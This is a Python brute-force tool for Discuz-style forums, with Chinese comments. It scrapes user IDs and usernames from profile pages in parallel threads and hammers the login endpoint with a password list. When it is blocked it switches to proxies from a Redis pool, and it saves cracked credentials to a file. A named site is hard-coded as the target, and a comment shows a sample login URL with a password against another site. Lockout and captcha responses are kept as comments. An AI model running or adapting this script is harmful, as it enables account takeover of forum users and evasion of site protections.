import requests
import re
import time
import pyquery
import threading
import sys
import redis


class Crack(object):
	encoding = 'utf8'
	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3278.0 Safari/537.36'}
	userlist = []
	passwordlist = ['username']
	proxies = []
	

	def __init__(self,url,start,stop):
		self.url = url #网站链接
		self.start = start #uid 起始值
		self.stop = stop  #uid 结束值
		self.password()
		self.f = open('res.txt','a',encoding="utf8")



	def proxiesfun(self):

		ii = 1
		while True:
			if len(self.proxies) < 1000:
				try:
					htmlobj = requests.get('http://www.xicidaili.com/nn/'+str(ii),headers=self.headers).text.encode().decode('utf8')
					doc = pyquery.PyQuery(htmlobj)
					tr = doc('tr')
					for i in tr:
						d = pyquery.PyQuery(i)
						ip = d('td').eq(1).text()
						prot = d('td').eq(2).text()
						self.proxies.append(ip+':'+prot)
				except Exception as e:
					# print(e)
					pass
				ii += 1
			else:
				# print(self.proxies)
				time.sleep(30)



	# def getproxies(self):

	# 	while True:
	# 		pass
	# 		pool = redis.ConnectionPool(host='localhost', port=6379)
	# 		conn = redis.Redis(connection_pool=pool)
	# 		ip = conn.spop('iplist1')
	# 		if ip:
	# 			proxies = {"http":"http://"+ip.decode()}
	# 			break
	# 	return proxies



	def getproxies(self):
		pool = redis.ConnectionPool(host='localhost', port=6379)
		conn = redis.Redis(connection_pool=pool)
		while True:
			# print('获取')
			try:
				
				ip = conn.spop('iplist2')
				if ip:
					print('检测',ip,'是否可以正常访问')
					ip = ip.decode()
					proxies = {"http":"http://"+ip}
					htmlobj = requests.get('http://permissions.hk-dna.cc/ip.php',headers=self.headers,proxies=proxies,timeout=10)
					if htmlobj.status_code == 200:
						break
				
				
			except Exception as e:
				print(e)
				# time.sleep(5)
				pass
		return proxies


	def password(self):
		with open('password.txt','r',encoding='utf8') as f:
			for r in f:
				self.passwordlist.append(r.strip())





# http://qq.youtube97.space/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1&handlekey=ls&quickforward=yes&password=admin888&username=110341040087456
	def getUsername(self,i):

		#看看是否可以正常访问
		try:
			indexobj = requests.get(self.url,headers=self.headers)
			encoding = requests.utils.get_encodings_from_content(indexobj.text)[0]
			if encoding:
				self.encoding = encoding
		except Exception as e:
			# print(e)
			print('无法访问')
			exit()
		
		uid = i
		while True:
			if uid > self.start:
				break
			else:
				uid += 10
		print('开始获取用户',uid)
		while True:
			if uid > self.stop:
				print('获取用户结束',i)
				break
			try:
				geturl = self.url+"/home.php?mod=space&uid="+str(uid)+"&do=profile&from=space"
				try:
					htmlobj = requests.get(geturl,headers=self.headers,timeout=1,allow_redirects=False)
					htmlobj.encoding = self.encoding
				except Exception as e:
					print('访问超时',geturl)
					uid += 10
					continue

				if htmlobj.status_code == 200:
					html = htmlobj.text.encode().decode('utf8')
					doc = pyquery.PyQuery(html)
					username = doc('#uhd h2').text()
					group    = doc('a[href*="home.php?mod=spacecp&ac=usergroup&gid"]').text()
					if not group:
						uid += 10
						continue
					if '限制会员' in group:
						uid += 10
						continue
					print(str(uid)+'\t'+username+'\t'+group)
					self.userlist.append({'uid':uid,'username':username,'group':group})
				pass
			except Exception as e:
				pass
			uid += 10
			
			


	def crack(self,uid,username,group):
		print('开始破解:',uid,username,group)
		# proxies = self.getproxies()
		self.passwordlist[0] = username
		conn = requests.Session()

		i = 0
		while True:
			password = self.passwordlist[i]

			loginurl = self.url+'/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1&handlekey=ls&quickforward=yes&username='+username+'&password='+password
			# print(loginurl)
			try:
				htmlobj = conn.get(loginurl,headers=self.headers,timeout=10)
				htmlobj.encoding = self.encoding
			except Exception as e:
				print(e)
				continue
			
			try:
				html = htmlobj.text.encode().decode('utf8')
				pattern = re.compile(r'.*?([\u4E00-\u9FA5]+).*?',re.S)
				msg = str(re.findall(pattern,html))
			except Exception as e:
				continue

			print(str(uid)+'\t'+username+'\t'+group+'\t'+msg+"\t"+"\t"+password)
			if '欢迎您回来' in msg:
				self.f.write(self.url+'\t'+username+'\t'+self.passwordlist[i-1]+'\t'+group+"\r\n")
				self.f.flush()
				print(str(uid)+'\t'+username+'\t'+group+'\t'+msg+"\t"+self.passwordlist[i-1])
				sys.exit()
				
			elif "无效用户" in msg:
				sys.exit()
			elif len(msg) > 200:
				sys.exit()
			elif '密码错误次数过多' in msg:
				# conn = requests.Session()
				# proxies = self.getproxies()
				# continue
				pass
			elif '访问被禁止' in msg:

				proxies = self.getproxies()
				continue

			# if msg
			i += 1
	



	def main(self):

		getUsernamejoin = []
		for i in range(10):
			w = threading.Thread(target=self.getUsername,args=(i,))
			w.start()
			getUsernamejoin.append(w)

		for i in getUsernamejoin:
			i.join()

		# self.getUsername()

		# w = threading.Thread(target=self.proxiesfun)
		# w.start()
		while True:

			if len(self.userlist) <= 0:
				break

			if threading.active_count() < 100:
				user = self.userlist.pop()
				w = threading.Thread(target=self.crack,args=(user['uid'],user['username'],user['group']))
				w.start()
			else:
				print('等待其他破解完成...')
				time.sleep(10)

if __name__ == '__main__':

	Crack('http://www.shiliu1.cc',1000,1500).main()
# feyman3808



# <?xml version="1.0" encoding="utf-8"?>
# <root><![CDATA[<h3 class="flb"><em>提示信息</em><span><a href="javascript:;" class="flbc" onclick="hideWindow('ls');" title="关闭">关闭</a></span></h3>
# <div class="c altw">
# <div class="alert_error">请输入验证码后继续登录<script type="text/javascript" reload="1">if(typeof errorhandle_ls=='function') {errorhandle_ls('请输入验证码后继续登录', {'type':'1'});}</script><script type="text/javascript">location.href='member.php?mod=logging&action=login&auth=4011XjCmE7zPUkCWdCox7rANu5%2Bm0CgYVV9XhgTlPl3u4BxZGL2nCbYH6pGuW2kP&referer=http%3A%2F%2Fqq.youtube97.space%2F.%2F'</script></div>
# </div>
# <p class="o pns">
# <button type="button" class="pn pnc" id="closebtn" onclick="hideWindow('ls');"><strong>确定</strong></button>
# <script type="text/javascript" reload="1">if($('closebtn')) {$('closebtn').focus();}</script>
# </p>
# ]]></root>




# <?xml version="1.0" encoding="utf-8"?>
# <root><![CDATA[<h3 class="flb"><em>提示信息</em><span><a href="javascript:;" class="flbc" onclick="hideWindow('ls');" title="关闭">关闭</a></span></h3>
# <div class="c altw">
# <div class="alert_error">密码错误次数过多，请 15 分钟后重新登录<script type="text/javascript" reload="1">if(typeof errorhandle_ls=='function') {errorhandle_ls('密码错误次数过多，请 15 分钟后重新登录', {});}</script></div>
# </div>
# <p class="o pns">
# <button type="button" class="pn pnc" id="closebtn" onclick="hideWindow('ls');"><strong>确定</strong></button>
# <script type="text/javascript" reload="1">if($('closebtn')) {$('closebtn').focus();}</script>
# </p>
# ]]></root>